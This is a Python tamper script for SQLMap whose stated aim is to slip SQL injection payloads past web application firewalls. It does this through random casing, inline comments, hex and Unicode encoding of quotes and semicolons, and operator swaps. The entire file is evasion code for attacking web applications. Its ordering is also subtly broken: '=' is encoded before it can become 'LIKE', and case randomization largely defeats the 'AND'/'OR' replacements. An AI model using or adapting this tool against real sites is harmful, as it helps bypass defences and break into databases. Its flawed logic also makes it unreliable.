"""
advanced_obfuscation.py - Advanced Custom Tamper Script for SQLMap

Description:
This script implements advanced SQL payload obfuscation techniques for bypassing modern WAFs.
1. Randomized casing of SQL keywords.
2. Insertion of random white spaces and inline comments.
3. Encoding of critical characters using Unicode or Hex.
4. Transformation of common operators into their functional equivalents.

### Author: AV10V ### 
Date: 16/11/2024
"""

import random

def tamper(payload):
    """
    Obfuscates the given SQL payload to bypass WAF detection.

    :param payload: Original SQL payload
    :return: Obfuscated SQL payload
    """
    if not payload:
        return payload

    def randomize_case(sql):
        """Randomizes the casing of SQL keywords."""
        return ''.join(
            char.upper() if random.choice([True, False]) else char.lower()
            for char in sql
        )

    def insert_inline_comments(sql):
        """Adds inline comments randomly in the SQL payload."""
        parts = sql.split(" ")
        obfuscated = []
        for part in parts:
            if random.choice([True, False]):
                obfuscated.append(f"{part}/**/")
            else:
                obfuscated.append(part)
        return " ".join(obfuscated)

    def encode_critical_characters(sql):
        """Encodes critical characters using Hex or Unicode."""
        encodings = {
            "'": "\\x27",  # Hex encoding for single quote
            '"': "\\x22",  # Hex encoding for double quote
            "=": "%3D",    # URL encoding for equal sign
            ";": "\\u003B" # Unicode encoding for semicolon
        }
        for char, encoded in encodings.items():
            sql = sql.replace(char, encoded)
        return sql

    def replace_operators(sql):
        """Replaces standard operators with functional equivalents."""
        replacements = {
            "=": "LIKE",
            "AND": "&&",
            "OR": "||",
            "--": "#"
        }
        for operator, replacement in replacements.items():
            sql = sql.replace(operator, replacement)
        return sql

    # Apply transformations in a pipeline
    payload = randomize_case(payload)
    payload = insert_inline_comments(payload)
    payload = encode_critical_characters(payload)
    payload = replace_operators(payload)

    return payload
